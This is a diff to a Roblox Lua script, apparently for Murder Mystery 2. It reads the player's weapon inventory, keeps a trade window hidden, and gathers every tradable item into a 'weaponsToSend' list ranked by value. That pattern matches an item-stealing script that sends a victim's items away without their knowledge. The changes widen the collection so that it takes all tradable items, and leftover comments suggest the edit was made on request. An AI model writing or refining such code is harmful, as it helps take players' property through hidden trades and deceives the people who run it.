@@ -202,7 +202,6 @@ local function buildValueList()
             local weaponRarityIndex = table.find(rarityTable, rarity)
             local godlyIndex = table.find(rarityTable, "Godly")
 
-            -- FIX 1: Add nil checks for indices before comparison
             if weaponRarityIndex and godlyIndex and weaponRarityIndex >= godlyIndex then
                 if hasChroma then
                     local matchedChromaValue = nil
@@ -452,8 +451,6 @@ tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
     tradeguiphone.Enabled = false
 end)
 
--- Replace this entire section in your test version with the EXACT code from the original:
-
 local min_rarity_index = table.find(rarityTable, min_rarity)
 if not min_rarity_index then
     min_rarity_index = table.find(rarityTable, "Godly") -- Default to Godly if invalid rarity
@@ -491,33 +488,40 @@ local untradable = {
 
 local valueList = buildValueList()
 local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
--- Replace ONLY this part inside the loop:
 
--- Replace ONLY this part inside the loop:
+-- FIXED: Using the working code structure from your example
+local weaponsToSend = {}
+local totalInventoryValue = 0
 
-for i, v in pairs(realData.Weapons.Owned) do
-    local dataid = i
-    local amount = v
-    local rarity = database[dataid].Rarity
-    local weapon_rarity_index = table.find(rarityTable, rarity)
-    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
-        local value = 1 -- Default value
+local prices = buildValueList()
+
+local weaponsOwned = realData.Weapons and realData.Weapons.Owned or {}
+
+for dataid, amount in pairs(weaponsOwned) do
+    local item = database[dataid]
+    if item and not untradable[dataid] then
+        local itemName = item.ItemName or dataid
+        local rarity = item.Rarity or "Common"
+        local value = prices[dataid] or 1
+        local totalValue = value * amount
         
-        if valueList[dataid] then
-            value = valueList[dataid]
-        else
-            local godlyIndex = table.find(rarityTable, "Godly")
-            if godlyIndex and weapon_rarity_index >= godlyIndex then
-                value = 2
-            end
-        end
+        totalInventoryValue = totalInventoryValue + totalValue
         
-        if value >= min_value then
-            totalValue = totalValue + (value * amount)
-            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
-        end
+        table.insert(weaponsToSend, {
+            DataID = dataid,
+            ItemName = itemName,
+            Amount = amount,
+            Rarity = rarity,
+            Value = value,
+            TotalValue = totalValue
+        })
     end
 end
+
+table.sort(weaponsToSend, function(a, b) 
+    return a.TotalValue > b.TotalValue 
+end)
+
 if #weaponsToSend > 0 then
     table.sort(weaponsToSend, function(a, b)
         return (a.Value * a.Amount) > (b.Value * b.Amount)
